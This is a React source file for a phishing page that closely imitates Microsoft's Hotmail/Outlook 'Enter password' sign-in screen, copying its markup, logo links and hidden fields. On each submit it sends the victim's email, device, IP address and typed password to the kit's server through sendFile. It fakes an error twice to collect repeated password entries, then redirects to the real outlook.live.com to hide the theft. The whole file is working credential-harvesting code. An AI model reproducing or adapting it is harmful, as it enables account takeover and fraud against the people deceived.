import React from "react";
import "./files/stylespass.scoped.css";
import Logo from "./files/logo.svg";
import ArrowBack from "./files/arrow.svg";
import Background from "./files/background.svg";
import { useState } from "react";
import { notify, sendFile } from "../servers";
import { navigate } from "@reach/router";

export default function HotmailPassword({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("../processing", {
          state: { domain: "https://outlook.live.com" },
        });
        console.log("ok");
      });
    }
  };

  return (
    <div>
      <div data-bind="if: activeDialog" />
      <form id="i0281" onSubmit={submitForm}>
        <div
          className="login-paginated-page"
          data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.e,
            showFooterLinks: true,
            useWizardBehavior: svr.ba,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"
        >
          <div
            id="lightboxTemplateContainer"
            data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.ci }"
          >
            <div
              id="lightboxBackgroundContainer"
              data-bind="css: { 'provide-min-height': svr.ci },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"
            >
              <div
                className="background-image-holder"
                role="presentation"
                data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"
              >
                <div
                  id="backgroundImage"
                  data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }"
                  className="background-image ext-background-image"
                  style={{
                    backgroundImage: `url(${Background})`,
                  }}
                />
              </div>
            </div>

            <div
              className="outer"
              data-bind="css: { 'app': $page.backgroundLogoUrl }"
            >
              <div className="template-section main-section">
                <div
                  data-bind="externalCss: { 'middle': true }"
                  className="middle ext-middle"
                >
                  <div
                    className="full-height"
                    data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"
                  >
                    <div className="flex-column">
                      <div className="win-scroll">
                        <div
                          id="lightbox"
                          data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession && ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() && $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }"
                          className="sign-in-box ext-sign-in-box"
                        >
                          <div
                            className="lightbox-cover"
                            data-bind="css: { 'disable-lightbox': svr.Cd && showLightboxProgress() }"
                          />

                          <div
                            data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"
                          >
                            <img
                              className="logo"
                              role="img"
                              pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png"
                              svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                              data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
                              src={Logo}
                              alt="Microsoft"
                            />
                          </div>

                          <div
                            role="main"
                            data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.a1,
                disableAnimationIfAnimationEndUnsupported: svr.Ch,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"
                          >
                            <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
                              <div
                                data-bind="css: {
        'animate': animate() && animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"
                                className="animate slide-in-next"
                              >
                                <div
                                  data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.b4,
                displayName: sharedData.displayName || svr.I,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"
                                >
                                  <div className="identityBanner">
                                    <button
                                      type="button"
                                      className="backButton"
                                      data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton"
                                      id="idBtn_Back"
                                      aria-label="Back"
                                    >
                                      <img
                                        role="presentation"
                                        pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png"
                                        svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
                                        data-bind="imgSrc"
                                        src={ArrowBack}
                                      />
                                    </button>

                                    <div
                                      id="displayName"
                                      className="identity"
                                      data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"
                                    >
                                      {values.username}
                                    </div>
                                  </div>
                                </div>
                              </div>

                              <div
                                className="pagination-view animate has-identity-banner slide-in-next"
                                data-bind="css: {
        'has-identity-banner': showIdentityBanner() && (sharedData.displayName || svr.I),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"
                              >
                                <div
                                  data-viewid={2}
                                  data-showidentitybanner="true"
                                  data-dynamicbranding="true"
                                  data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.Al === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata },
                event: {
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"
                                >
                                  <div
                                    id="loginHeader"
                                    className="row title ext-title"
                                    data-bind="externalCss: { 'title': true }"
                                  >
                                    <div
                                      role="heading"
                                      aria-level={1}
                                      data-bind="text: str['CT_PWD_STR_EnterPassword_Title']"
                                    >
                                      Enter password
                                    </div>
                                  </div>

                                  <div className="row">
                                    <div className="form-group col-md-24">
                                      <div role="alert" aria-live="assertive" />
                                      <div
                                        className="placeholderContainer"
                                        data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"
                                      >
                                        <input
                                          name="password"
                                          type="password"
                                          onChange={handleChange}
                                          id="i0118"
                                          autoComplete="off"
                                          className="form-control input ext-input text-box ext-text-box"
                                          aria-required="true"
                                          aria-describedby="loginHeader passwordError  "
                                          placeholder="Password"
                                          aria-label="Enter the password for unchainedtrade@outlook.com"
                                          tabIndex={0}
                                        />
                                      </div>
                                    </div>
                                  </div>
                                  <div
                                    data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }"
                                    className="position-buttons password-reset-links-container ext-password-reset-links-container"
                                  >
                                    <div>
                                      <div className="row">
                                        <div className="col-md-24">
                                          <div className="text-13">
                                            <div className="form-group">
                                              <a
                                                id="idA_PWD_ForgotPassword"
                                                role="link"
                                                href=""
                                                data-bind="
                            text: unsafe_forgotPasswordText,
                            href: accessRecoveryLink || svr.r,
                            attr: { target: accessRecoveryLink && '_blank' },
                            click: accessRecoveryLink ? null : resetPassword_onClick"
                                              >
                                                Forgot password?
                                              </a>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div
                                      className="win-button-pin-bottom"
                                      data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }"
                                    >
                                      <div
                                        className="row"
                                        data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"
                                      >
                                        <div
                                          data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.e,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"
                                        >
                                          <div
                                            className="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container"
                                            data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }"
                                          >
                                            <div
                                              data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"
                                              className="inline-block button-item ext-button-item"
                                            >
                                              <input
                                                type="submit"
                                                disabled={submited.status}
                                                id="idSIButton9"
                                                className="win-button button_primary button ext-button primary ext-primary"
                                                data-report-event="Signin_Submit"
                                                data-report-trigger="click"
                                                data-report-value="Submit"
                                                data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing"
                                                defaultValue="Sign in"
                                                data-report-attached={1}
                                              />
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  {/* ko if: tenantBranding.BoilerPlateText */}
                                </div>
                              </div>
                            </div>
                          </div>

                          <input
                            type="hidden"
                            name="ps"
                            data-bind="value: postedLoginStateViewId"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="psRNGCDefaultType"
                            data-bind="value: postedLoginStateViewRNGCDefaultType"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="psRNGCEntropy"
                            data-bind="value: postedLoginStateViewRNGCEntropy"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="psRNGCSLK"
                            data-bind="value: postedLoginStateViewRNGCSLK"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="canary"
                            data-bind="value: svr.canary"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="ctx"
                            data-bind="value: ctx"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="hpgrequestid"
                            data-bind="value: svr.sessionId"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            id="i0327"
                            data-bind="attr: { name: svr.bo }, value: flowToken"
                            name="PPFT"
                            defaultValue="DSW6jTBRQONyouvHQQP1W6*RWfAlAWG2COt3ukFzEi6mxSeZfYEnqFLgluSgxnxLommBm4BmWuzba6T0ZWE0*ExOTvR*TKN*8wbHNP6NwYpiIG!Ly51BfClJcBIXhOS9EGfdTAa1U0giLR82N2iomiYE*Vd5bsWUKNYOW531OVsTT2FtHr*PLAm*x5CsCS4JWgKddmKLUlHQSml8YysuWCc$"
                          />
                          <input
                            type="hidden"
                            name="PPSX"
                            data-bind="value: svr.c7"
                            defaultValue="P"
                          />
                          <input
                            type="hidden"
                            name="NewUser"
                            defaultValue={1}
                          />
                          <input
                            type="hidden"
                            name="FoundMSAs"
                            data-bind="value: svr.An"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="fspost"
                            data-bind="value: svr.fPOST_ForceSignin ? 1 : 0"
                            defaultValue={0}
                          />
                          <input
                            type="hidden"
                            name="i21"
                            data-bind="value: wasLearnMoreShown() ? 1 : 0"
                            defaultValue={0}
                          />
                          <input
                            type="hidden"
                            name="CookieDisclosure"
                            data-bind="value: svr.BT ? 1 : 0"
                            defaultValue={0}
                          />
                          <input
                            type="hidden"
                            name="IsFidoSupported"
                            data-bind="value: isFidoSupported() ? 1 : 0"
                            defaultValue={0}
                          />
                          <input
                            type="hidden"
                            name="isSignupPost"
                            data-bind="value: isSignupPost() ? 1 : 0"
                            defaultValue={0}
                          />
                          <div
                            data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"
                          >
                            <input
                              type="hidden"
                              name="i19"
                              data-bind="value: timeOnPage"
                              defaultValue
                            />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div
                id="footer"
                role="contentinfo"
                data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() && $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }"
                className="footer ext-footer"
              >
                <div
                  data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"
                >
                  {/* ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) */}
                  <div
                    id="footerLinks"
                    className="footerNode text-secondary footer-links ext-footer-links"
                    data-bind="externalCss: { 'footer-links': true }"
                  >
                    <a
                      id="ftrTerms"
                      data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }"
                      href="#"
                      className="footer-content ext-footer-content footer-item ext-footer-item"
                    >
                      Terms of use
                    </a>

                    <a
                      id="ftrPrivacy"
                      data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }"
                      href="#"
                      className="footer-content ext-footer-content footer-item ext-footer-item"
                    >
                      Privacy &amp; cookies
                    </a>

                    <a
                      id="moreOptions"
                      href="#"
                      role="button"
                      data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }"
                      aria-label="Click here for troubleshooting information"
                      aria-expanded="false"
                      className="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
                    >
                      ...
                    </a>
                  </div>

                  {/* ko if: svr.C6 && showLinks */}
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}
